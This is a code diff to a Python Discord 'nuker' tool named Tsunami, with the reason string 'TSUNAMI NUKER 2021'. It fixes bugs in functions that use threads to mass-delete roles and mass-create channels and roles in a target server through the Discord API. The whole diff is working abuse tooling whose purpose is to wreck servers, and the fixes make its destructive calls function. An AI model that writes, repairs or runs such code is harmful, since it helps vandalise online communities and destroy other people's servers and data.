@@ -138,7 +138,7 @@ class Tsunami:
             payload = {
                 'reason': 'TSUNAMI NUKER 2021'
             }
-            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}').result()
+            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}', json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                 break
@@ -203,7 +203,7 @@ class Tsunami:
                 'name': name,
                 'type': 0
             }
-            requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
+            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
@@ -220,7 +220,7 @@ class Tsunami:
                 'name': name,
                 'type': 0
             }
-            requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=payload)
+            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
@@ -238,7 +238,7 @@ class Tsunami:
                 'type': 0,
                 'nsfw': True
             }
-            requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
+            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
@@ -255,7 +255,7 @@ class Tsunami:
                 'name': name,
                 'type': 2
             }
-            requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
+            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
@@ -272,7 +272,7 @@ class Tsunami:
                 'name': name,
                 'type': 2
             }
-            requests.post(f'https://canary.discordapp.com/api/v9/guilds/{server}/roles', headers=headers, json=payload)
+            r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{guild}/roles', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
@@ -374,14 +374,14 @@ class Tsunami:
     async def tsudr(self):        
         guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
         roles = open('roles.tsu') 
-        for role in role:
+        for role in roles:
             Thread(target=self.deleteroles, args=(guild, role)).start()
         roles.close()           
 
     async def tsudr2(self):        
         guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
         roles = open('roles.tsu') 
-        for role in role:
+        for role in roles:
             Thread(target=self.deleteroles2, args=(guild, role)).start()
         roles.close()               
 
